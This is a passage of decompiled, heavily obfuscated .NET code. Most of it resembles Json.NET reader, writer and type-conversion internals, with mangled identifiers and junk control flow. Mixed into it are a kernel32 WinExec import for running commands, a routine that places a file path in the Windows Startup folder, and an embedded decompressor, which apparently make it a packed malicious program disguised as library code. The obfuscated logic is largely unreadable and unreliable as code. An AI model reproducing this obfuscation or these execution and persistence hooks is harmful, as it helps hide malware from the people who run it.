      throw \u0014.\u0006.\u0001(obj3, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(22905), (IFormatProvider) CultureInfo.InvariantCulture, (object) str, (object) obj4.Name));
label_18:
      throw \u0014.\u0006.\u0001(obj3, \u0014.\u0006.\u0082(15958) + (object) obj3.\u0001());
label_20:
      return objList;
    }

    static object \u0001([In] \u0012.\u0005 obj0, [In] \u0011.\u0003 obj1)
    {
      \u0014.\u0006.\u0001(obj1);
label_31:
      switch (((\u0012.\u0007) obj1).\u0001)
      {
        case \u0012.\u0007.\u0001.\u0001:
        case \u0012.\u0007.\u0001.\u0003:
        case \u0012.\u0007.\u0001.\u0006:
        case \u0012.\u0007.\u0001.\u0007:
        case \u0012.\u0007.\u0001.\u000E:
        case \u0012.\u0007.\u0001.\u000F:
        case \u0012.\u0007.\u0001.\u0010:
          char ch;
          while (true)
          {
            do
            {
              do
              {
                ch = obj1.\u0001[obj1.\u0002];
                if (ch > '\r')
                  goto label_2;
label_1:
                switch (ch)
                {
                  case char.MinValue:
                    goto label_5;
                  case '\t':
                    goto label_25;
                  case '\n':
                    goto label_24;
                  case '\r':
                    if (false)
                      goto label_27;
                    else
                      goto label_23;
                  default:
                    goto label_27;
                }
label_2:
                switch (ch)
                {
                  case ' ':
                    break;
                  case '!':
                  case '#':
                  case '$':
                  case '%':
                  case '&':
                  case '(':
                  case ')':
                  case '*':
                  case '+':
                    goto label_27;
                  case '"':
                  case '\'':
                    goto label_8;
                  case ',':
                    goto label_18;
                  case '-':
                  case '.':
                  case '0':
                  case '1':
                  case '2':
                  case '3':
                  case '4':
                  case '5':
                  case '6':
                  case '7':
                  case '8':
                  case '9':
                    goto label_16;
                  case '/':
                    goto label_17;
                  case ']':
                    goto label_19;
                  default:
                    if (true)
                    {
                      if (ch == 'n')
                        goto label_15;
                      else
                        goto label_27;
                    }
                    else
                      goto label_29;
                }
label_25:
                if (false)
                  goto label_1;
                else
                  goto label_26;
label_27:
                ++obj1.\u0002;
              }
              while (\u009A.\u0005\u0004(ch));
              goto label_28;
label_5:
              if (false)
                goto label_31;
            }
            while (!\u0014.\u0006.\u0001(obj1));
            break;
label_17:
            \u0014.\u0006.\u0001(obj1, false);
            continue;
label_18:
            \u0014.\u0006.\u0001(obj1);
            continue;
label_23:
            \u0014.\u0006.\u0001(obj1, false);
            continue;
label_24:
            \u0014.\u0006.\u0001(obj1);
            continue;
label_26:
            ++obj1.\u0002;
          }
          \u0014.\u0006.\u0001((\u0012.\u0007) obj1, JsonToken.None, (object) null, false);
          return (object) null;
label_8:
          \u0014.\u0006.\u0001(obj1, ch, obj0);
          if (obj0 == \u0012.\u0005.\u0002)
            return (object) \u0014.\u0006.\u0001((\u0012.\u0007) obj1, obj1.\u0001.ToString());
          if (obj0 == \u0012.\u0005.\u0005)
            return (object) \u0014.\u0006.\u0001((\u0012.\u0007) obj1, obj1.\u0001.ToString());
          if (obj0 == \u0012.\u0005.\u0008)
            return (object) \u0014.\u0006.\u0001((\u0012.\u0007) obj1, obj1.\u0001.ToString());
          throw new ArgumentOutOfRangeException(\u0014.\u0006.\u0082(6218));
label_15:
          \u0014.\u0006.\u0001(obj1);
          return (object) null;
label_16:
          \u0014.\u0006.\u0001(obj1, obj0);
          return obj1.\u0001();
label_19:
          ++obj1.\u0002;
          if (((\u0012.\u0007) obj1).\u0001 != \u0012.\u0007.\u0001.\u0007 && ((\u0012.\u0007) obj1).\u0001 != \u0012.\u0007.\u0001.\u0006 && ((\u0012.\u0007) obj1).\u0001 != \u0012.\u0007.\u0001.\u000E)
            throw \u0014.\u0006.\u0001(obj1, ch);
          \u0014.\u0006.\u0001((\u0012.\u0007) obj1, JsonToken.EndArray);
          return (object) null;
label_28:
          throw \u0014.\u0006.\u0001(obj1, ch);
        case \u0012.\u0007.\u0001.\u0012:
label_29:
          \u0014.\u0006.\u0001(obj1);
          return (object) null;
        default:
          throw \u0014.\u0006.\u0001((\u0012.\u0007) obj1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(3605), (IFormatProvider) \u0098.\u0002\u0004(), (object) ((\u0012.\u0007) obj1).\u0001));
      }
    }

    static \u0008.\u0003 \u0001([In] \u0016.\u0001 obj0)
    {
      \u0008.\u0003? nullable = obj0.\u0001;
      int num = nullable.HasValue ? 1 : 0;
      if (false)
        return (\u0008.\u0003) num;
      return num == 0 ? \u0008.\u0003.\u0001 : nullable.GetValueOrDefault();
    }

    static void \u0001([In] \u0016.\u0008 obj0)
    {
      while (obj0.\u0001 != null)
      {
        if (true)
        {
          if (true)
          {
            obj0.\u0001 = (\u0005.\u000E) null;
            if (true)
              return;
            break;
          }
          break;
        }
      }
      throw new InvalidOperationException(\u0014.\u0006.\u0082(22974));
    }

    static \u0011.\u0001 \u0001([In] JsonWriter obj0) => obj0.\u0001;

    static void \u0001([In] \u0015.\u0012 obj0, [In] string obj1, [In] \u0015.\u0013 obj2)
    {
      \u0014.\u0006.\u0001(obj0);
      obj0.\u0001[obj1] = obj2;
    }

    static void \u0001([In] JsonWriter obj0)
    {
    }

    static bool \u0001([In] \u000E.\u000E obj0, [In] \u0015.\u0013 obj1)
    {
      if (obj1 == obj0.\u0001)
        return \u0014.\u0006.\u0001(obj0);
      \u0015.\u0013 obj = obj1.\u0002;
      if (obj == null || obj == obj1 || obj1 == ((\u0015.\u0013) obj1.\u0001()).\u0003())
        return obj1.\u0001() == null ? \u0014.\u0006.\u0001(obj0) : \u0014.\u0006.\u0001(obj0, obj1.\u0001());
      obj0.\u0003 = obj;
      \u0014.\u0006.\u0001(obj0, obj0.\u0003);
      return true;
    }

    static \u0016.\u000E \u0001([In] \u000F.\u0007 obj0) => obj0.\u0001;

    static void \u0001([In] ConstructorInfo obj0, [In] \u0011.\u0008 obj1)
    {
      obj1.\u0002 = obj0;
      obj1.\u0001 = (object) obj0 != null ? \u0014.\u0006.\u0001().\u0001((MethodBase) obj0) : (\u0004.\u000F<object>) null;
    }

    static \u0011.\u0006 \u0001([In] \u0016.\u0001 obj0)
    {
      \u0011.\u0006? nullable = obj0.\u0001;
      int num = nullable.HasValue ? 1 : 0;
      if (false)
        return (\u0011.\u0006) num;
      return num == 0 ? \u0011.\u0006.\u0001 : nullable.GetValueOrDefault();
    }

    static void \u0001([In] \u0011.\u0003 obj0, [In] int obj1)
    {
      ++obj0.\u0004;
      obj0.\u0003 = obj1;
    }

    static void \u0001([In] \u0010.\u0006 obj0, [In] JsonWriter obj1, [In] \u0016.\u0007 obj2, [In] object obj3)
    {
      if (((\u0016.\u0008) obj0).\u0001 != null && ((\u0016.\u0008) obj0).\u0001.\u0001() >= TraceLevel.Info)
        goto label_2;
label_1:
      \u0014.\u0006.\u0001(obj2, obj3, ((\u0016.\u0008) obj0).\u0001.\u0001);
      return;
label_2:
      ((\u0016.\u0008) obj0).\u0001.\u0001(TraceLevel.Info, \u0011.\u0002.\u0001((\u000F.\u0001) null, \u0014.\u0006.\u0001(obj1), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(23059), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj2.\u0002())), (Exception) null);
      goto label_1;
    }

    static void \u0001([In] JsonWriter obj0, [In] JsonContainerType obj1)
    {
      if (obj0.\u0001.\u0001 != JsonContainerType.None)
      {
        if (obj0.\u0001 == null)
          obj0.\u0001 = new List<\u0011.\u0002>();
        obj0.\u0001.Add(obj0.\u0001);
      }
      obj0.\u0001 = new \u0011.\u0002(obj1);
    }

    static JsonProperty \u0001([In] string obj0, [In] StringComparison obj1, [In] \u0006.\u0004 obj2)
    {
      if (true)
        goto label_14;
label_5:
      JsonProperty jsonProperty1;
      return jsonProperty1;
label_14:
      if (obj1 != StringComparison.Ordinal)
        goto label_3;
      else
        goto label_15;
label_1:
      JsonProperty jsonProperty2;
      int num1;
      return num1 == 0 ? (JsonProperty) null : jsonProperty2;
label_3:
      if (true)
        goto label_17;
label_11:
      int index;
      int num2;
      while (true)
      {
        do
          ;
        while (false);
        if (index < obj2.\u0001.Count)
        {
          jsonProperty1 = obj2.\u0001[index];
          if (!\u008E\u0002.\u0007\u0006(obj0, jsonProperty1.\u0001, obj1))
          {
            if (true)
            {
              num2 = index;
              if (true)
                ++num2;
              if (true)
                index = num2;
              else
                break;
            }
            else
              goto label_15;
          }
          else
            goto label_5;
        }
        else
          goto label_13;
      }
      num1 = num2;
      goto label_1;
label_13:
      return (JsonProperty) null;
label_17:
      index = 0;
      goto label_11;
label_15:
      num1 = obj2.\u0001(obj0, out jsonProperty2) ? 1 : 0;
      goto label_1;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001([In] \u0002.\u0006 obj0, [In] \u0011.\u000E obj1, [In] XmlNodeConverter obj2)
    {
label_0:
      if (true)
        goto label_6;
label_1:
      do
      {
        if (true)
        {
          if (true)
          {
            if (obj0 is XElementWrapper && obj0.\u0001(\u0014.\u0006.\u0082(9935)) == null)
              obj0.\u0001(obj1.\u0002(\u0014.\u0006.\u0082(23109), \u0014.\u0006.\u0082(9885), \u0014.\u0006.\u0082(9935)));
          }
          else
            goto label_0;
        }
      }
      while (false);
      return;
label_6:
      obj0.\u0001(obj1.\u0002(\u0014.\u0006.\u0082(23092), \u0014.\u0006.\u0082(9935), \u0014.\u0006.\u0082(4136)));
      goto label_1;
    }

    static TypeConverter \u0001([In] System.Type obj0) => \u0011\u0005.\u0007\u000E(obj0);

    static \u0004.\u0006.\u0002 \u0001(
      System.Type _param0,
      ref object _param1,
      CultureInfo _param2,
      [Out] object _param3)
    {
      if (_param3 == null)
        throw new ArgumentNullException(\u0014.\u0006.\u0082(23126));
      int num1 = \u0014.\u0006.\u0001(_param0) ? 1 : 0;
      System.Type type;
      int num2;
      while (true)
      {
        if (num1 != 0)
          _param0 = \u0099\u0002.\u001F\u0006(_param0);
        type = \u0001\u0002.\u007E\u0017\u0004(_param3);
        if ((object) _param0 != (object) type)
        {
          if (true)
          {
            if (\u0014.\u0006.\u0001(\u0001\u0002.\u007E\u0017\u0004(_param3)) && \u0014.\u0006.\u0001(_param0))
            {
              if (\u0015.\u000E.\u0005(_param0))
              {
                if (!(_param3 is string))
                {
                  num2 = \u0014.\u0006.\u0001(_param3) ? 1 : 0;
                  if (false)
                    num1 = num2;
                  else
                    goto label_13;
                }
                else
                  goto label_11;
              }
              else
                goto label_15;
            }
            else
              goto label_16;
          }
          else
            goto label_30;
        }
        else
          break;
      }
      _param1 = _param3;
      return \u0004.\u0006.\u0002.\u0001;
label_11:
      _param1 = \u0015\u0004.\u0008\u0008(_param0, global::\u0001.\u007E\u0001(_param3), true);
      return \u0004.\u0006.\u0002.\u0001;
label_13:
      if (num2 != 0)
      {
        _param1 = \u008F\u0003.\u0080\u0007(_param0, _param3);
        return \u0004.\u0006.\u0002.\u0001;
      }
label_15:
      _param1 = \u0016\u0004.\u000E\u0008(_param3, _param0, (IFormatProvider) _param2);
      return \u0004.\u0006.\u0002.\u0001;
label_16:
      // ISSUE: type reference
      // ISSUE: type reference
      // ISSUE: type reference
      switch (_param3)
      {
        case DateTime _ when (object) _param0 == (object) \u0004\u0002.\u0084\u0004(__typeref (DateTimeOffset)):
          _param1 = (object) new DateTimeOffset((DateTime) _param3);
          return \u0004.\u0006.\u0002.\u0001;
        case byte[] _ when (object) _param0 == (object) \u0004\u0002.\u0084\u0004(__typeref (Guid)):
          _param1 = (object) new Guid((byte[]) _param3);
          return \u0004.\u0006.\u0002.\u0001;
        case Guid _ when (object) _param0 == (object) \u0004\u0002.\u0084\u0004(__typeref (byte[])):
          _param1 = (object) ((Guid) _param3).ToByteArray();
          return \u0004.\u0006.\u0002.\u0001;
        case string str:
          // ISSUE: type reference
          if ((object) _param0 == (object) \u0004\u0002.\u0084\u0004(__typeref (Guid)))
          {
            _param1 = (object) new Guid(str);
            return \u0004.\u0006.\u0002.\u0001;
          }
          // ISSUE: type reference
          if ((object) _param0 == (object) \u0004\u0002.\u0084\u0004(__typeref (Uri)))
          {
            _param1 = (object) new Uri(str, UriKind.RelativeOrAbsolute);
            return \u0004.\u0006.\u0002.\u0001;
          }
          // ISSUE: type reference
          if ((object) _param0 == (object) \u0004\u0002.\u0084\u0004(__typeref (TimeSpan)))
          {
            _param1 = (object) \u0014.\u0006.\u0001(str);
            break;
          }
          // ISSUE: type reference
          if ((object) _param0 != (object) \u0004\u0002.\u0084\u0004(__typeref (byte[])))
          {
            // ISSUE: type reference
            if ((object) _param0 == (object) \u0004\u0002.\u0084\u0004(__typeref (Version)))
            {
              Version version;
              if (\u0014.\u0006.\u0001(ref version, str))
              {
                _param1 = (object) version;
                return \u0004.\u0006.\u0002.\u0001;
              }
              _param1 = (object) null;
              return \u0004.\u0006.\u0002.\u0004;
            }
            // ISSUE: type reference
            if (\u0093\u0002.\u007E\u0012\u0006((object) \u0004\u0002.\u0084\u0004(__typeref (System.Type)), _param0))
            {
              _param1 = (object) \u0012\u0005.\u0008\u000E(str, true);
              return \u0004.\u0006.\u0002.\u0001;
            }
            goto default;
          }
          else
            goto label_29;
        default:
          TypeConverter typeConverter1 = \u0014.\u0006.\u0001(type);
          if (typeConverter1 != null && \u0093\u0002.\u007E\u0014\u0006((object) typeConverter1, _param0))
          {
            _param1 = \u0013\u0005.\u007E\u000E\u000E((object) typeConverter1, (ITypeDescriptorContext) null, _param2, _param3, _param0);
            return \u0004.\u0006.\u0002.\u0001;
          }
          TypeConverter typeConverter2 = \u0014.\u0006.\u0001(_param0);
          if (typeConverter2 != null && \u0093\u0002.\u007E\u0015\u0006((object) typeConverter2, type))
          {
            _param1 = \u0014\u0005.\u007E\u000F\u000E((object) typeConverter2, (ITypeDescriptorContext) null, _param2, _param3);
            return \u0004.\u0006.\u0002.\u0001;
          }
          if (_param3 == DBNull.Value)
          {
            if (\u0014.\u0006.\u0001(_param0))
            {
              _param1 = \u0014.\u0006.\u0001((object) null, type, _param0);
              int num3 = 0;
              return num3 != 0 ? (\u0004.\u0006.\u0002) num3 : (\u0004.\u0006.\u0002) num3;
            }
            _param1 = (object) null;
            return \u0004.\u0006.\u0002.\u0002;
          }
          if (_param3 is INullable)
          {
            _param1 = \u0014.\u0006.\u0001(\u0014.\u0006.\u0001((INullable) _param3), type, _param0);
            if (true)
              return \u0004.\u0006.\u0002.\u0001;
            goto label_29;
          }
          else
          {
            if (\u0015.\u000E.\u0002(_param0) || \u0015.\u000E.\u0004(_param0) || \u0015.\u000E.\u0008(_param0))
            {
              if (true)
              {
                _param1 = (object) null;
                return \u0004.\u0006.\u0002.\u0003;
              }
              break;
            }
            _param1 = (object) null;
            return \u0004.\u0006.\u0002.\u0004;
          }
      }
      return \u0004.\u0006.\u0002.\u0001;
label_29:
      _param1 = (object) \u0003\u0002.\u0083\u0004(str);
label_30:
      return \u0004.\u0006.\u0002.\u0001;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001([In] IList<MemberInfo> obj0_1, [In] System.Type obj1, [In] BindingFlags obj2)
    {
      do
      {
        if ((obj2 & BindingFlags.NonPublic) != BindingFlags.Default)
          goto label_4;
label_3:
        continue;
label_4:
        BindingFlags bindingAttr = ReflectionUtils.\u0001(obj2, BindingFlags.Public);
        while ((object) (obj1 = \u0015.\u000E.\u0001(obj1)) != null)
        {
          IEnumerable<MemberInfo> memberInfos = ((IEnumerable<FieldInfo>) obj1.GetFields(bindingAttr)).Where<FieldInfo>((Func<FieldInfo, bool>) (obj0_2 => \u0015\u0002.\u007E\u0081\u0005((object) obj0_2))).Cast<MemberInfo>();
          \u000E.\u0008.\u0001<MemberInfo>(obj0_1, memberInfos);
        }
        goto label_3;
      }
      while (false);
    }

    static void \u0001()
    {
      if (\u0014.\u0001.\u0005 == null)
        return;
      \u0014.\u0001.\u0006 = global::\u0006.\u009A(global::\u0003.\u0096(Environment.SpecialFolder.Startup), \u001B.\u0006\u0003(\u0014.\u0001.\u0005));
    }

    static string \u0001([In] XmlNodeConverter obj0, [In] IXmlNode obj1, [In] XmlNamespaceManager obj2)
    {
      string str1;
      switch (obj1.\u0003())
      {
        case null:
label_4:
          str1 = (string) null;
          goto label_5;
        default:
          if (!\u0007\u0002.\u008C\u0004(obj1.\u0001(), \u0014.\u0006.\u0082(9926)))
            goto label_3;
          else
            break;
      }
label_2:
      if (\u0007\u0002.\u008C\u0004(obj1.\u0003(), \u0014.\u0006.\u0082(9885)))
        goto label_4;
label_3:
      str1 = \u0016\u0003.\u007E\u009E\u0006((object) obj2, obj1.\u0003());
label_5:
      string str2 = str1;
      if (true)
        return !global::\u0007.\u009E(str2) ? global::\u0005.\u0099(str2, \u0014.\u0006.\u0082(3197), \u001B.\u0003\u0003(obj1.\u0001())) : \u001B.\u0003\u0003(obj1.\u0001());
      goto label_2;
    }

    static DateTime \u0001([In] DateTime obj0)
    {
      if (true)
      {
        DateTimeKind kind = obj0.Kind;
        while (true)
        {
          switch (kind)
          {
            case DateTimeKind.Unspecified:
              if (true)
                return new DateTime(obj0.Ticks, DateTimeKind.Utc);
              break;
            case DateTimeKind.Utc:
              return obj0;
            case DateTimeKind.Local:
              return obj0.ToUniversalTime();
          }
          if (true)
            break;
        }
      }
      return obj0;
    }

    [DllImport("kernel32.dll", EntryPoint = "WinExec")]
    static extern uint \u0001([In] string obj0, [In] uint obj1);

    static void \u0001([In] JsonContainerType obj0, [In] \u0012.\u0007 obj1)
    {
      \u0014.\u0006.\u0001(obj1);
      if (obj1.\u0001.\u0001 == JsonContainerType.None)
      {
        if (true)
        {
          obj1.\u0001 = new \u0011.\u0002(obj0);
          if (true)
            return;
          goto label_7;
        }
      }
      else
        goto label_10;
label_6:
      if (!obj1.\u0001.HasValue)
        return;
label_7:
      int num = obj1.\u0001() + 1;
      int? nullable = obj1.\u0001;
      int valueOrDefault = nullable.GetValueOrDefault();
      if ((num > valueOrDefault ? (nullable.HasValue ? 1 : 0) : 0) == 0 || obj1.\u0001)
        return;
      obj1.\u0001 = true;
      throw \u0014.\u0006.\u0001(obj1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(23143), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj1.\u0001));
label_10:
      if (obj1.\u0001 == null)
        goto label_11;
label_5:
      obj1.\u0001.Add(obj1.\u0001);
      obj1.\u0001 = new \u0011.\u0002(obj0);
      goto label_6;
label_11:
      obj1.\u0001 = new List<\u0011.\u0002>();
      goto label_5;
    }

    static void \u0001(
      [In] string obj0,
      [In] JsonProperty obj1,
      [In] JsonSerializerInternalReader obj2,
      [In] ref System.Type obj3,
      [In] ref \u0016.\u0007 obj4,
      [In] \u0006.\u0002 obj5,
      [In] JsonProperty obj6,
      [In] \u0012.\u0007 obj7)
    {
      if (true)
        goto label_25;
label_17:
      System.Type type;
      if ((object) type == null)
        throw \u0014.\u0006.\u0001(obj7, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(23269), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0));
      if (obj2.\u0001 != null && obj2.\u0001.\u0001() >= TraceLevel.Verbose)
        obj2.\u0001.\u0001(TraceLevel.Verbose, \u0011.\u0002.\u0001(obj7 as \u000F.\u0001, obj7.\u0001(), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(23334), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0, (object) type)), (Exception) null);
      if ((object) obj3 == null)
        goto label_24;
label_22:
      if (!\u0093\u0002.\u007E\u0012\u0006((object) obj3, type))
        throw \u0014.\u0006.\u0001(obj7, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(23371), (IFormatProvider) \u0098.\u0002\u0004(), (object) global::\u0001.\u007E\u0013((object) type), (object) global::\u0001.\u007E\u0013((object) obj3)));
label_24:
      obj3 = type;
      obj4 = \u0014.\u0006.\u0001(obj2, type);
      return;
label_25:
      \u0006.\u0001? nullable1 = obj1?.\u0001();
      if (true)
        goto label_26;
label_1:
      \u0006.\u0001? nullable2;
      int num;
      if (nullable2.HasValue)
        num = (int) nullable2.GetValueOrDefault();
      else
        goto label_27;
label_13:
      if (num == 0)
        return;
      string str1;
      string str2;
      \u0014.\u0006.\u0001(ref str1, obj0, out str2);
      try
      {
        type = \u0015\u0005.\u007E\u0010\u000E((object) obj2.\u0001.\u0001, str1, str2);
        goto label_17;
      }
      catch (Exception ex)
      {
        throw \u0014.\u0006.\u0001(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(23208), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0), ex, obj7);
      }
label_27:
      \u0006.\u0001? nullable3;
      if (obj5 == null)
        nullable3 = new \u0006.\u0001?();
      else
        goto label_29;
label_3:
      \u0006.\u0001? nullable4;
      if (true)
        nullable4 = nullable3;
      else
        goto label_22;
label_5:
      \u0006.\u0001? nullable5 = nullable4;
      if (!nullable5.HasValue)
      {
        \u0006.\u0001? nullable6;
        if (obj6 == null)
          nullable6 = new \u0006.\u0001?();
        else if (true)
          nullable6 = obj6.\u0002();
        else
          goto label_3;
        num = (int) nullable6 ?? (int) obj2.\u0001.\u0001;
        goto label_13;
      }
      else
      {
        num = (int) nullable5.GetValueOrDefault();
        goto label_13;
      }
label_29:
      nullable4 = obj5.\u0001();
      goto label_5;
label_26:
      nullable2 = nullable1;
      goto label_1;
    }

    static bool \u0001([In] \u0011.\u0003 obj0)
    {
      while (true)
      {
        char ch;
        do
        {
          ch = obj0.\u0001[obj0.\u0002];
          if (ch > '\r')
            goto label_17;
          else
            goto label_15;
label_1:
          int num1;
          int num2;
          switch (num1 - num2)
          {
            case 0:
              goto label_11;
            case 1:
              goto label_10;
            case 4:
              goto label_9;
            default:
              goto label_12;
          }
label_15:
          if (ch == char.MinValue)
          {
            if (obj0.\u0001 == obj0.\u0002)
              continue;
            goto label_6;
          }
          else
          {
            int num3 = (int) ch;
            num2 = 9;
            num1 = num3;
            goto label_1;
          }
label_17:
          if (ch != ' ')
          {
            if (ch != '/')
            {
              num1 = (int) ch;
              num2 = 125;
              if (num2 != 0)
              {
                if (num1 == num2)
                  goto label_7;
                else
                  goto label_12;
              }
              else
                goto label_1;
            }
            else
              goto label_8;
          }
          else
            goto label_11;
        }
        while (\u0014.\u0006.\u0001(false, obj0) != 0);
        break;
label_6:
        ++obj0.\u0002;
        continue;
label_9:
        \u0014.\u0006.\u0001(obj0, false);
        continue;
label_10:
        \u0014.\u0006.\u0001(obj0);
        continue;
label_11:
        ++obj0.\u0002;
        continue;
label_12:
        if (\u009A.\u0005\u0004(ch))
          ++obj0.\u0002;
        else
          goto label_14;
      }
      return false;
label_7:
      \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.EndObject);
      ++obj0.\u0002;
      return true;
label_8:
      \u0014.\u0006.\u0001(obj0, true);
      return true;
label_14:
      return \u0014.\u0006.\u0001(obj0);
    }

    static \u0012.\u0011<string, string> \u0001([In] System.Type obj0_1)
    {
      \u0012.\u0011<string, string> obj = new \u0012.\u0011<string, string>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase, (IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
      foreach (FieldInfo field in obj0_1.GetFields())
      {
        string name = field.Name;
        string str = field.GetCustomAttributes(typeof (EnumMemberAttribute), true).Cast<EnumMemberAttribute>().Select<EnumMemberAttribute, string>((Func<EnumMemberAttribute, string>) (obj0_2 => global::\u0001.\u007E\u0094((object) obj0_2))).SingleOrDefault<string>() ?? field.Name;
        if (obj.\u0001(str, out string _))
          throw new InvalidOperationException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(23452), (IFormatProvider) CultureInfo.InvariantCulture, (object) str, (object) obj0_1.Name));
        obj.\u0001(name, str);
      }
      return obj;
    }

    static void \u0001([In] ILGenerator obj0, [In] PropertyInfo obj1)
    {
      MethodInfo methodInfo;
      do
      {
        methodInfo = \u0010\u0004.\u007E\u0002\u0008((object) obj1, true);
        if (\u0015\u0002.\u007E\u0097\u0004((object) methodInfo))
          goto label_3;
      }
      while (false);
      goto label_7;
label_3:
      \u0010\u0002.\u007E\u0091\u0004((object) obj0, OpCodes.Ldarg_1);
      do
      {
        \u0003.\u0003.\u0003(obj0, \u0001\u0002.\u007E\u001D\u0004((object) obj1));
        \u0003.\u0003.\u0001(obj0, methodInfo);
        if (true)
          \u0003.\u0003.\u0001(obj0);
      }
      while (false);
      return;
label_7:
      \u0003.\u0003.\u0001(obj0, \u0001\u0002.\u007E\u0018\u0004((object) obj1));
      goto label_3;
    }

    static \u0015.\u0002 \u0001([In] \u0012.\u0007 obj0) => obj0.\u0001;

    static \u0004.\u0001 \u0001([In] \u0012.\u0007 obj0) => obj0.\u0001;

    static object \u0001([In] \u0015.\u0007 obj0, [In] object obj1, [In] string obj2) => obj0.\u0001()[obj2].\u0001()(obj1);

    static \u0015.\u0013 \u0001([In] \u0015.\u0013 obj0, [In] \u0004.\u0011 obj1, [In] bool obj2)
    {
      if (true)
      {
        if (true)
        {
          if (obj0 == null)
            return (\u0015.\u0013) new \u0006.\u0005((object) null, JTokenType.Null);
          if (obj2)
            return obj0;
          goto label_10;
        }
        else
          goto label_11;
      }
      else
        goto label_10;
label_5:
      obj0 = obj0.\u0001();
label_6:
      return obj0;
label_10:
      if (obj0.\u0001() != null)
        goto label_5;
label_11:
      if (obj0 != obj1)
      {
        if (true)
        {
          if (true)
          {
            if (!obj0.\u0001() || \u0014.\u0006.\u0001((\u0015.\u0013) obj1) != obj0)
              goto label_6;
            else
              goto label_5;
          }
          else
            goto label_10;
        }
        else
          goto label_6;
      }
      else
        goto label_5;
    }

    static unsafe bool \u0001([In] \u0013.\u000F.\u0005 obj0, [In] \u0013.\u000F.\u0002 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      while (true)
      {
        *(int*) ((IntPtr) voidPtr + 8) = obj0.\u0001;
        int num1;
        int num2;
        int num3;
        int num4;
        switch (*(int*) ((IntPtr) voidPtr + 8))
        {
          case 0:
            obj0.\u0002 = \u0014.\u0006.\u0001(obj1, 5);
            if (obj0.\u0002 >= 0)
              break;
            goto label_2;
          case 1:
label_4:
            obj0.\u0003 = \u0014.\u0006.\u0001(obj1, 5);
            if (obj0.\u0003 >= 0)
            {
              ++obj0.\u0003;
              \u0014.\u0006.\u0001(obj1, 5);
              obj0.\u0005 = obj0.\u0002 + obj0.\u0003;
              obj0.\u0002 = new byte[obj0.\u0005];
              obj0.\u0001 = 2;
              goto case 2;
            }
            else
              goto label_5;
          case 2:
            obj0.\u0004 = \u0014.\u0006.\u0001(obj1, 4);
            if (obj0.\u0004 >= 0)
            {
              obj0.\u0004 += 4;
              \u0014.\u0006.\u0001(obj1, 4);
              obj0.\u0001 = new byte[19];
              goto label_10;
            }
            else
              goto label_8;
          case 3:
label_15:
            int num5;
            int num6;
            while (true)
            {
              num5 = obj0.\u0007;
              num6 = obj0.\u0004;
              if (true)
              {
                if (num5 < num6)
                  *(int*) voidPtr = \u0014.\u0006.\u0001(obj1, 3);
                else
                  goto label_17;
label_12:
                if (*(int*) voidPtr >= 0)
                {
                  \u0014.\u0006.\u0001(obj1, 3);
                  obj0.\u0001[\u0013.\u000F.\u0005.\u0003[obj0.\u0007]] = (byte) *(int*) voidPtr;
                  ++obj0.\u0007;
                  continue;
                }
                goto label_13;
label_17:
                obj0.\u0001 = new \u0013.\u000F.\u0004(obj0.\u0001);
                obj0.\u0001 = (byte[]) null;
                if (false)
                  goto label_12;
                else
                  break;
              }
              else
                goto label_1;
            }
            obj0.\u0007 = 0;
            obj0.\u0001 = 4;
            goto case 4;
label_1:
            num4 = num6;
            num3 = num5;
            goto label_40;
          case 4:
            int num7;
            int num8;
            do
            {
              num7 = num8 = \u0014.\u0006.\u0001(obj0.\u0001, obj1);
              if (true)
              {
                if (true)
                {
                  if ((num8 & -16) == 0)
                    obj0.\u0002[obj0.\u0007++] = obj0.\u0001 = (byte) num7;
                  else
                    goto label_25;
                }
                else
                  goto label_47;
              }
              else
                goto label_46;
            }
            while (obj0.\u0007 != obj0.\u0005);
            if (false)
              goto label_10;
            else
              goto label_21;
label_25:
            if (num7 >= 0)
            {
              if (true)
              {
                if (num7 >= 17)
                  obj0.\u0001 = (byte) 0;
                obj0.\u0006 = num7 - 16;
                obj0.\u0001 = 5;
                goto case 5;
              }
              else
                goto label_35;
            }
            else
              goto label_26;
label_47:
            num1 = num8;
            goto label_34;
label_46:
            num2 = num8;
            goto label_38;
          case 5:
label_31:
            *(int*) ((IntPtr) voidPtr + 4) = \u0013.\u000F.\u0005.\u0002[obj0.\u0006];
            int num9 = \u0014.\u0006.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4));
            if (num9 >= 0)
            {
              \u0014.\u0006.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4));
              num1 = num9;
              goto label_34;
            }
            else
              goto label_32;
          default:
            continue;
        }
label_3:
        obj0.\u0002 += 257;
        if (true)
        {
          \u0014.\u0006.\u0001(obj1, 5);
          obj0.\u0001 = 1;
          goto label_4;
        }
        else
          goto label_31;
label_10:
        obj0.\u0007 = 0;
        obj0.\u0001 = 3;
        goto label_15;
label_34:
